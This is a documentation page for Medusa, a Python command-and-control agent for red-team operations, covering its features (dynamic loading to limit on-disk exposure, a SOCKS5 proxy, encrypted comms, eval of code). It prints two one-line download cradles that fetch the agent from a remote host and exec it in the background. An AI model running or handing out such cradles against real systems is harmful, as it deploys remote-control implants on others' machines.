+++
title = "Medusa"
chapter = false
weight = 5
+++

![logo](/agents/medusa/medusa.svg?width=200px)
## Summary

Medusa is a cross-platform Python agent compatible with Python 2.7 and 3.8.

### Highlighted Agent Features

Python is an incredibly popular programming language and is often installed by default on many operating systems. Python 2.7, for example, is currently available on the latest macOS installs (though expected to be discontinued).
Default libraries, such as `Cocoa` and `ctypes`, allow access to Objective-C APIs and functionality through Windows DLLs.

The Medusa agent itself has several key features including:
- Support for dynamic loading/unloading of functionality to limit exposure of agent capabilities on-disk. 
- A SOCKS5 proxy compatible across Python 2.7 and 3.8, and across macOS, Windows and Linux.
- Encrypted comms.
- `Eval()` of Python code to dynamically extend functionality.

With the ability to execute arbitrary script on the command-line, a rudementary download cradle can be used, such as the below (notably, not proxy-aware):
```
python3 -c "import urllib.request; exec(urllib.request.urlopen('https://[REMOTE_HOST]/medusa.py').read())" &
```

Or for Python 2.7:
```
python -c "import urllib2;exec(urllib2.urlopen('https://[REMOTE_HOST]/medusa.py').read())" &
```

### Important Notes
Each job is executed in a new thread. Long-running jobs can be viewed with the `jobs` command and, where a 'stop' functionality has been implemented, they can be killed with `jobkill`.

## Authors
@ajpc500


